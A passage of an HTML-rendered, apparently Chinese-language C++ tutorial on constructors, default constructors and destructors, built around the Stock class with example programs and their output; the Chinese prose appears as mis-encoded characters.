class="line"></span><br><span class="line"><span class="comment">// å¸¦å‚æ•°çš„æ„é€ å‡½æ•°å®šä¹‰</span></span><br><span class="line">Stock::Stock(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n, <span class="keyword">double</span> pr) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Constructor using &quot;</span> &lt;&lt; co &lt;&lt; <span class="string">&quot; called\n&quot;</span>; <span class="comment">// åªæ˜¯ä¸ºäº†æ¼”ç¤º</span></span><br><span class="line">    company = co;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares can&#x27;t be negative; &quot;</span></span><br><span class="line">                  &lt;&lt; company &lt;&lt; <span class="string">&quot; shares set to 0.\n&quot;</span>;</span><br><span class="line">        shares = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares = n;</span><br><span class="line">    &#125;</span><br><span class="line">    share_val = pr;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... buy(), sell(), update(), show() çš„å®šä¹‰ä¿æŒä¸å˜ ...</span></span><br><span class="line"><span class="comment">// (æ³¨æ„ï¼šbuy, sell, update å†…éƒ¨çš„ set_tot() è°ƒç”¨ä»ç„¶éœ€è¦)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares purchased can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares += num;</span><br><span class="line">        share_val = price;</span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares sold can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; shares) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You can&#x27;t sell more than you have! &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares -= num;</span><br><span class="line">        share_val = price;</span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::update</span><span class="params">(<span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    share_val = price;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::ios_base::fmtflags orig =</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios_base::fixed, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::streamsize prec = <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Company: &quot;</span> &lt;&lt; company</span><br><span class="line">              &lt;&lt; <span class="string">&quot;  Shares: &quot;</span> &lt;&lt; shares &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Share Price: $&quot;</span> &lt;&lt; share_val;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Total Worth: $&quot;</span> &lt;&lt; total_val &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(orig, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(prec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-3-2-ä½¿ç”¨æ„é€ å‡½æ•°"><a href="#10-3-2-ä½¿ç”¨æ„é€ å‡½æ•°" class="headerlink" title="10.3.2 ä½¿ç”¨æ„é€ å‡½æ•°"></a>10.3.2 ä½¿ç”¨æ„é€ å‡½æ•°</h3><p>å½“åˆ›å»ºå¯¹è±¡æ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨é€‰æ‹©åŒ¹é…çš„æ„é€ å‡½æ•°æ¥æ‰§è¡Œã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span> <span class="comment">// åŒ…å« Stock ç±»å®šä¹‰</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è°ƒç”¨å¸¦å‚æ•°çš„æ„é€ å‡½æ•° Stock(const std::string &amp;co, long n, double pr)</span></span><br><span class="line">    <span class="function">Stock <span class="title">stock1</span><span class="params">(<span class="string">&quot;NanoSmart&quot;</span>, <span class="number">12</span>, <span class="number">20.0</span>)</span></span>; <span class="comment">// æ˜¾å¼æä¾›æ‰€æœ‰å‚æ•°</span></span><br><span class="line">    stock1.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨å¸¦å‚æ•°çš„æ„é€ å‡½æ•°ï¼Œåˆ©ç”¨äº† n å’Œ pr çš„é»˜è®¤å€¼ (n=0, pr=0.0)</span></span><br><span class="line">    <span class="function">Stock <span class="title">stock2</span><span class="params">(<span class="string">&quot;Boffo Objects&quot;</span>)</span></span>; <span class="comment">// ç­‰åŒäº Stock(&quot;Boffo Objects&quot;, 0, 0.0)</span></span><br><span class="line">    stock2.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•° Stock()</span></span><br><span class="line">    Stock stock3; <span class="comment">// æ³¨æ„ï¼šè¿™é‡Œä¸èƒ½å†™ stock3()</span></span><br><span class="line">    stock3.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¹Ÿå¯ä»¥ä½¿ç”¨ C++11 çš„åˆ—è¡¨åˆå§‹åŒ–</span></span><br><span class="line">    Stock stock4 = &#123;<span class="string">&quot;Fleep Enterprises&quot;</span>, <span class="number">100</span>, <span class="number">1.25</span>&#125;; <span class="comment">// è°ƒç”¨å¸¦å‚æ•°æ„é€ å‡½æ•°</span></span><br><span class="line">    stock4.show();</span><br><span class="line"></span><br><span class="line">    Stock stock5&#123;<span class="string">&quot;Dummy Corp&quot;</span>&#125;; <span class="comment">// è°ƒç”¨å¸¦å‚æ•°æ„é€ å‡½æ•° (åˆ©ç”¨é»˜è®¤å€¼)</span></span><br><span class="line">    stock5.show();</span><br><span class="line"></span><br><span class="line">    Stock stock6&#123;&#125;; <span class="comment">// è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•° Stock()</span></span><br><span class="line">    stock6.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŠ¨æ€åˆ†é…å¯¹è±¡æ—¶ä¹Ÿä¼šè°ƒç”¨æ„é€ å‡½æ•°</span></span><br><span class="line">    Stock *p_stock = <span class="keyword">new</span> Stock(<span class="string">&quot;Electroshock Games&quot;</span>, <span class="number">18</span>, <span class="number">19.0</span>);</span><br><span class="line">    p_stock-&gt;show();</span><br><span class="line">    <span class="keyword">delete</span> p_stock; <span class="comment">// ç¨åä¼šçœ‹åˆ° delete ä¼šè°ƒç”¨ææ„å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºå¯èƒ½åŒ…å« (å–å†³äºç¼–è¯‘å™¨å’Œä¼˜åŒ–):</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Constructor using NanoSmart called</span><br><span class="line">Company: NanoSmart  Shares: 12</span><br><span class="line">  Share Price: $20.000  Total Worth: $240.00</span><br><span class="line">Constructor using Boffo Objects called</span><br><span class="line">Company: Boffo Objects  Shares: 0</span><br><span class="line">  Share Price: $0.000  Total Worth: $0.00</span><br><span class="line">Default constructor called</span><br><span class="line">Company: no name  Shares: 0</span><br><span class="line">  Share Price: $0.000  Total Worth: $0.00</span><br><span class="line">Constructor using Fleep Enterprises called</span><br><span class="line">Company: Fleep Enterprises  Shares: 100</span><br><span class="line">  Share Price: $1.250  Total Worth: $125.00</span><br><span class="line">Constructor using Dummy Corp called</span><br><span class="line">Company: Dummy Corp  Shares: 0</span><br><span class="line">  Share Price: $0.000  Total Worth: $0.00</span><br><span class="line">Default constructor called</span><br><span class="line">Company: no name  Shares: 0</span><br><span class="line">  Share Price: $0.000  Total Worth: $0.00</span><br><span class="line">Constructor using Electroshock Games called</span><br><span class="line">Company: Electroshock Games  Shares: 18</span><br><span class="line">  Share Price: $19.000  Total Worth: $342.00</span><br></pre></td></tr></table></figure><h3 id="10-3-3-é»˜è®¤æ„é€ å‡½æ•°"><a href="#10-3-3-é»˜è®¤æ„é€ å‡½æ•°" class="headerlink" title="10.3.3 é»˜è®¤æ„é€ å‡½æ•°"></a>10.3.3 é»˜è®¤æ„é€ å‡½æ•°</h3><p><strong>é»˜è®¤æ„é€ å‡½æ•° (Default Constructor)</strong> æ˜¯æŒ‡<strong>ä¸æ¥å—ä»»ä½•å‚æ•°</strong>çš„æ„é€ å‡½æ•°ã€‚</p><ul><li>  <strong>ç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤æ„é€ å‡½æ•°:</strong> å¦‚æœä½ <strong>æ²¡æœ‰</strong>ä¸ºç±»å®šä¹‰<strong>ä»»ä½•</strong>æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ä¸ºä½ ç”Ÿæˆä¸€ä¸ªé»˜è®¤æ„é€ å‡½æ•°ã€‚è¿™ä¸ªåˆæˆçš„æ„é€ å‡½æ•°ä»€ä¹ˆä¹Ÿä¸åšï¼ˆå¯¹äºå†…ç½®ç±»å‹æˆå‘˜ä¸ä¼šåˆå§‹åŒ–ï¼Œå¯¹äºç±»ç±»å‹æˆå‘˜ä¼šè°ƒç”¨å…¶é»˜è®¤æ„é€ å‡½æ•°ï¼‰ã€‚</li><li>  <strong>ç”¨æˆ·å®šä¹‰çš„é»˜è®¤æ„é€ å‡½æ•°:</strong> å¦‚æœä½ å®šä¹‰äº†ä¸€ä¸ªæ— å‚æ•°çš„æ„é€ å‡½æ•°ï¼ˆå¦‚ä¸Šé¢ <code>Stock::Stock()</code>ï¼‰ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯é»˜è®¤æ„é€ å‡½æ•°ã€‚</li><li>  <strong>é‡è¦è§„åˆ™:</strong> å¦‚æœä½ ä¸ºç±»å®šä¹‰äº†<strong>ä»»ä½•</strong>æ„é€ å‡½æ•°ï¼ˆå³ä½¿æ˜¯å¸¦å‚æ•°çš„ï¼‰ï¼Œç¼–è¯‘å™¨å°±<strong>ä¸ä¼š</strong>å†è‡ªåŠ¨ç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•°äº†ã€‚å¦‚æœä½ è¿˜éœ€è¦ä¸€ä¸ªæ— å‚æ•°çš„æ„é€ å‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œä¸ºäº†èƒ½åˆ›å»º <code>Stock stock3;</code> è¿™æ ·çš„å¯¹è±¡ï¼‰ï¼Œä½ å°±å¿…é¡»<strong>æ˜¾å¼åœ°å®šä¹‰</strong>å®ƒã€‚</li></ul><p>åœ¨æˆ‘ä»¬çš„ <code>Stock</code> ç¤ºä¾‹ä¸­ï¼Œå› ä¸ºæˆ‘ä»¬å®šä¹‰äº† <code>Stock(const std::string &amp;co, ...)</code>ï¼Œç¼–è¯‘å™¨å°±ä¸ä¼šè‡ªåŠ¨ç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•°ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¿…é¡»è‡ªå·±æä¾› <code>Stock::Stock()</code>ï¼Œå¦åˆ™ <code>Stock stock3;</code> è¿™æ ·çš„å£°æ˜å°†å¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚</p><p><strong>C++11 <code>= default</code>:</strong> å¦‚æœä½ å®šä¹‰äº†å…¶ä»–æ„é€ å‡½æ•°ï¼Œä½†ä»å¸Œæœ›ç¼–è¯‘å™¨ä¸ºä½ ç”Ÿæˆé»˜è®¤çš„ã€è¡Œä¸ºç®€å•çš„é»˜è®¤æ„é€ å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨ <code>= default</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Example(<span class="keyword">int</span> v) : value(v) &#123;&#125; <span class="comment">// ç”¨æˆ·å®šä¹‰çš„å¸¦å‚æ„é€ å‡½æ•°</span></span><br><span class="line">    Example() = <span class="keyword">default</span>; <span class="comment">// æ˜¾å¼è¦æ±‚ç¼–è¯‘å™¨ç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="10-3-4-ææ„å‡½æ•°"><a href="#10-3-4-ææ„å‡½æ•°" class="headerlink" title="10.3.4 ææ„å‡½æ•°"></a>10.3.4 ææ„å‡½æ•°</h3><p><strong>ææ„å‡½æ•° (Destructor)</strong> æ˜¯å¦ä¸€ç§ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°ï¼Œå®ƒçš„ä¸»è¦ç›®çš„æ˜¯åœ¨å¯¹è±¡<strong>ç”Ÿå‘½å‘¨æœŸç»“æŸ</strong>æ—¶æ‰§è¡Œæ¸…ç†å·¥ä½œã€‚</p><p><strong>ç”¨é€”:</strong></p><ul><li>  é‡Šæ”¾å¯¹è±¡åœ¨ç”Ÿå‘½å‘¨æœŸå†…åˆ†é…çš„èµ„æºï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡ <code>new</code> åˆ†é…çš„å†…å­˜ï¼‰ã€‚</li><li>  æ‰§è¡Œä»»ä½•å¿…è¦çš„å…³é—­æ“ä½œï¼ˆä¾‹å¦‚ï¼Œå…³é—­æ–‡ä»¶ã€æ–­å¼€ç½‘ç»œè¿æ¥ï¼‰ã€‚</li></ul><p><strong>ç‰¹ç‚¹ä¸è§„åˆ™:</strong></p><ol><li> <strong>åç§°:</strong> ææ„å‡½æ•°çš„åç§°æ˜¯åœ¨ç±»åå‰åŠ ä¸Šæ³¢æµªå· <code>~</code>ï¼ˆä¾‹å¦‚ <code>~Stock</code>ï¼‰ã€‚</li><li> <strong>æ²¡æœ‰è¿”å›ç±»å‹:</strong> å’Œæ„é€ å‡½æ•°ä¸€æ ·ï¼Œææ„å‡½æ•°ä¹Ÿæ²¡æœ‰è¿”å›ç±»å‹ï¼Œè¿ <code>void</code> ä¹Ÿæ²¡æœ‰ã€‚</li><li> <strong>æ²¡æœ‰å‚æ•°:</strong> ææ„å‡½æ•°ä¸èƒ½æ¥å—ä»»ä½•å‚æ•°ï¼Œå› æ­¤ä¸èƒ½è¢«é‡è½½ã€‚ä¸€ä¸ªç±»æœ€å¤šåªæœ‰ä¸€ä¸ªææ„å‡½æ•°ã€‚</li><li><strong>è‡ªåŠ¨è°ƒç”¨:</strong> å½“å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œææ„å‡½æ•°ä¼šè‡ªåŠ¨è¢«è°ƒç”¨ã€‚è¿™å‘ç”Ÿåœ¨ï¼š<ul><li>  å¯¹è±¡çš„<strong>ä½œç”¨åŸŸç»“æŸ</strong>æ—¶ï¼ˆå¯¹äºè‡ªåŠ¨å­˜å‚¨å¯¹è±¡ï¼Œå¦‚å‡½æ•°å†…çš„å±€éƒ¨å¯¹è±¡ï¼‰ã€‚</li><li>  å½“å¯¹æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆè°ƒç”¨ <code>delete</code> æ—¶ï¼ˆå¯¹äºåŠ¨æ€å­˜å‚¨å¯¹è±¡ï¼‰ã€‚</li><li>  å½“åŒ…å«è¯¥å¯¹è±¡çš„å¯¹è±¡è¢«é”€æ¯æ—¶ã€‚</li></ul></li></ol><p><strong>å£°æ˜è¯­æ³• (åœ¨ç±»å®šä¹‰å†…):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... æ„é€ å‡½æ•°å’Œå…¶ä»–æˆå‘˜ ...</span></span><br><span class="line">    <span class="comment">// ææ„å‡½æ•°å£°æ˜</span></span><br><span class="line">    ~ClassName();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>å®šä¹‰è¯­æ³• (åœ¨ç±»å¤–éƒ¨):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassName::~ClassName() &#123;</span><br><span class="line">    <span class="comment">// æ¸…ç†ä»£ç </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ï¼šä¸º <code>Stock</code> ç±»æ·»åŠ ææ„å‡½æ•°</strong></p><p>å¯¹äºæˆ‘ä»¬å½“å‰çš„ <code>Stock</code> ç±»ï¼Œå®ƒå¹¶æ²¡æœ‰åœ¨å†…éƒ¨ä½¿ç”¨ <code>new</code> åˆ†é…å†…å­˜ï¼Œæ‰€ä»¥ææ„å‡½æ•°ä¸æ˜¯ä¸¥æ ¼å¿…éœ€çš„ã€‚ä½†ä¸ºäº†æ¼”ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ªç®€å•çš„ææ„å‡½æ•°ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨ stock.h çš„ç±»å®šä¹‰ä¸­å£°æ˜</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... constructors ...</span></span><br><span class="line">    <span class="comment">// ... other public methods ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ææ„å‡½æ•°å£°æ˜</span></span><br><span class="line">    ~Stock();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨ stock.cpp ä¸­å®šä¹‰ææ„å‡½æ•°</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... constructor definitions ...</span></span><br><span class="line"><span class="comment">// ... other method definitions ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ææ„å‡½æ•°å®šä¹‰</span></span><br><span class="line">Stock::~Stock() &#123;</span><br><span class="line">    <span class="comment">// å¯¹äºè¿™ä¸ªç®€å•çš„ Stock ç±»ï¼Œæ²¡ä»€ä¹ˆéœ€è¦æ˜¾å¼æ¸…ç†çš„</span></span><br><span class="line">    <span class="comment">// ä½†æˆ‘ä»¬å¯ä»¥åŠ ä¸€æ¡æ‰“å°è¯­å¥æ¥è§‚å¯Ÿå®ƒä½•æ—¶è¢«è°ƒç”¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bye, &quot;</span> &lt;&lt; company &lt;&lt; <span class="string">&quot;!\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è§‚å¯Ÿææ„å‡½æ•°çš„è°ƒç”¨:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªå†…éƒ¨ä½œç”¨åŸŸ</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Entering inner block ---\n&quot;</span>;</span><br><span class="line">        <span class="function">Stock <span class="title">stock1</span><span class="params">(<span class="string">&quot;Smart Comp&quot;</span>, <span class="number">50</span>, <span class="number">5.0</span>)</span></span>;</span><br><span class="line">        <span class="function">Stock <span class="title">stock2</span><span class="params">(<span class="string">&quot;Great Gadgets&quot;</span>, <span class="number">10</span>, <span class="number">12.0</span>)</span></span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Exiting inner block ---\n&quot;</span>;</span><br><span class="line">        <span class="comment">// å½“ç¦»å¼€è¿™ä¸ªä½œç”¨åŸŸæ—¶ï¼Œstock2 å’Œ stock1 (æŒ‰ç›¸åé¡ºåºåˆ›å»º) ä¼šè¢«é”€æ¯</span></span><br><span class="line">    &#125; <span class="comment">// stock2 çš„ææ„å‡½æ•°å…ˆè°ƒç”¨ï¼Œç„¶åæ˜¯ stock1 çš„</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Creating dynamic stock ---\n&quot;</span>;</span><br><span class="line">    Stock *p_stock = <span class="keyword">new</span> Stock(<span class="string">&quot;Dynamic Duo&quot;</span>, <span class="number">25</span>, <span class="number">2.5</span>);</span><br><span class="line">    p_stock-&gt;show();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Deleting dynamic stock ---\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span> p_stock; <span class="comment">// è°ƒç”¨ææ„å‡½æ•°ï¼Œç„¶åé‡Šæ”¾å†…å­˜</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- main() is ending ---\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å¯èƒ½çš„è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--- Entering inner block ---</span><br><span class="line">Constructor using Smart Comp called</span><br><span class="line">Constructor using Great Gadgets called</span><br><span class="line">--- Exiting inner block ---</span><br><span class="line">Bye, Great Gadgets!</span><br><span class="line">Bye, Smart Comp!</span><br><span class="line">--- Creating dynamic stock ---</span><br><span class="line">Constructor using Dynamic Duo called</span><br><span class="line">Company: Dynamic Duo  Shares: 25</span><br><span class="line">  Share Price: $2.500  Total Worth: $62.50</span><br><span class="line">--- Deleting dynamic stock ---</span><br><span class="line">Bye, Dynamic Duo!</span><br><span class="line">--- main() is ending ---</span><br></pre></td></tr></table></figure><p>æ³¨æ„ææ„å‡½æ•°è°ƒç”¨çš„æ—¶æœºå’Œé¡ºåºï¼ˆå¯¹äºå±€éƒ¨å¯¹è±¡ï¼Œä¸æ„é€ é¡ºåºç›¸åï¼‰ã€‚</p><h3 id="10-3-5-æ”¹è¿›-Stock-ç±»"><a href="#10-3-5-æ”¹è¿›-Stock-ç±»" class="headerlink" title="10.3.5 æ”¹è¿› Stock ç±»"></a>10.3.5 æ”¹è¿› Stock ç±»</h3><p>ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æ•´åˆæ„é€ å‡½æ•°å’Œææ„å‡½æ•°ï¼Œå¾—åˆ°ä¸€ä¸ªæ›´å®Œå–„ï¼ˆè™½ç„¶åœ¨è¿™ä¸ªä¾‹å­ä¸­ææ„å‡½æ•°ä½œç”¨ä¸å¤§ï¼‰çš„ <code>Stock</code> ç±»ã€‚</p><p><strong>stock.h (æœ€ç»ˆç‰ˆæœ¬)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\stock.h</span></span><br><span class="line"><span 